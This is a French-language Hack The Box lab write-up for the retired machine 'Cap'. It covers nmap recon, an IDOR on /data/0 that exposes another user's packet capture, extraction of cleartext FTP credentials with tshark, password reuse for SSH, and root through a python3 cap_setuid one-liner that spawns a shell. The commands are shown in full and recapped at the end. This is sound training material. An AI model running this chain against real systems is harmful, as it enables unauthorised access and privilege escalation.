# Cap — HTB Machines (Labs)

| | |
|---|---|
| **Section** | Machines (Labs) — retirée |
| **Machine** | `Cap` |
| **OS** | Linux (Ubuntu 20.04.2) |
| **IP cible** | `10.129.189.2` *(change à chaque spawn)* |
| **Difficulté** | Easy |
| **Date** | 2026-11-01 |
| **Résultat** | user.txt ✅ · root.txt ✅ |

---

## TL;DR — chaîne d'attaque

```
nmap  →  21 FTP · 22 SSH · 80 HTTP (Security Dashboard, Gunicorn)
      →  dashboard /data/<id> : IDOR en changeant l'id  →  /data/0
      →  download de la capture 0.pcap (celle d'un admin)
      →  tshark : trafic FTP en clair  →  nathan : Buck3tH4TF0RM3!
      →  SSH nathan  →  user.txt
      →  getcap : /usr/bin/python3.8 = cap_setuid  →  setuid(0)  →  root  →  root.txt
```

---

## 1. Reconnaissance

```bash
box cap <IP>                          # crée le dossier + exporte $IP
nmap -sV -sC -oN nmap/initial $IP
```

Résultat :

| Port | Service | Version |
|---|---|---|
| 21/tcp | ftp | vsftpd 3.0.3 |
| 22/tcp | ssh | OpenSSH 8.2p1 (Ubuntu) |
| 80/tcp | http | Gunicorn — *Security Dashboard* |

> ⚠️ Cap est une machine des **Labs**, pas Starting Point → il faut le VPN **Machines/Labs** (`htb-vpn restart machines-us-5.ovpn`), sinon `Destination Host Unreachable`.

Le dashboard (port 80) a trois fonctions : `/data` (captures réseau), `/ipconfig`, `/netstat`.

---

## 2. Accès initial (foothold)

### 2.1 IDOR sur `/data/<id>`

En générant une capture, l'URL est de la forme `http://$IP/data/1`, `/data/2`… Le numéro identifie *ta* capture, **sans vérifier que tu as le droit de la voir** → on change l'id à la main :

```
http://10.129.189.2/data/0
```

**Concept = IDOR** (*Insecure Direct Object Reference*) : accès à un objet juste en devinant son identifiant. `/data/0` = la capture d'un autre utilisateur (un admin). On télécharge le `.pcap`.

### 2.2 Analyse de la capture — FTP en clair

```bash
mv ~/Downloads/0.pcap ./loot/0.pcap
tshark -r loot/0.pcap -Y ftp
```

Le FTP transmet les identifiants **en clair** (comme Telnet sur Meow) :

```
Request: USER nathan
Request: PASS Buck3tH4TF0RM3!
Response: 230 Login successful.
```

> Alternative GUI : ouvrir le `.pcap` dans Wireshark → clic droit sur un paquet FTP → *Follow → TCP Stream*.

### 2.3 Connexion → user.txt

Les identifiants marchent sur FTP **et** SSH (réutilisation de mot de passe) :

```bash
ssh nathan@$IP          # mot de passe : Buck3tH4TF0RM3!
id                      # uid=1001(nathan)
cat user.txt
```

---

## 3. Élévation de privilèges → root.txt

Énumération des **capabilities Linux** (super-pouvoirs de root découpés et attribués à un binaire précis) :

```bash
getcap -r / 2>/dev/null
```

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

**`cap_setuid` sur python3** = ce Python peut changer son UID, y compris devenir **uid 0 (root)**. On passe root puis on lance un shell :

```bash
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id                      # uid=0(root)
cat /root/root.txt
```

> `sudo -l` ne servait à rien ici (nathan n'est pas sudoer) : la privesc passe par la **capability**, pas par sudo. Réflexe : [GTFOBins → python](https://gtfobins.github.io/gtfobins/python/) (chercher *capabilities*).

---

## 4. Leçons à retenir

- **IDOR** : si une ressource est accessible via un identifiant dans l'URL (`/data/0`), toujours tester de l'incrémenter/décrémenter. L'appli doit vérifier les droits, pas supposer que tu ne devineras pas l'id.
- **Protocoles en clair** : FTP (comme Telnet) expose les identifiants dans le trafic. Une capture réseau = crédentials offerts.
- **Réutilisation de mot de passe** : le même secret ouvre FTP **et** SSH. Tester un credential trouvé sur tous les services.
- **Capabilities ≠ SUID** : `getcap -r /` fait partie du check privesc au même titre que `find / -perm -4000` et `sudo -l`. `cap_setuid` sur un interpréteur (python, perl…) = root quasi garanti.
- **Bon VPN selon la section** : Starting Point et Labs utilisent des fichiers `.ovpn` différents.

---

## Commandes — récap express

```bash
# Recon
htb-vpn restart machines-us-5.ovpn
box cap <IP>
nmap -sV -sC -oN nmap/initial $IP

# Foothold (IDOR + sniff FTP)
# -> naviguer sur http://$IP/data/0 et télécharger la capture
tshark -r loot/0.pcap -Y ftp          # nathan : Buck3tH4TF0RM3!
ssh nathan@$IP
cat user.txt

# Privesc (capability cap_setuid)
getcap -r / 2>/dev/null
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
cat /root/root.txt
```
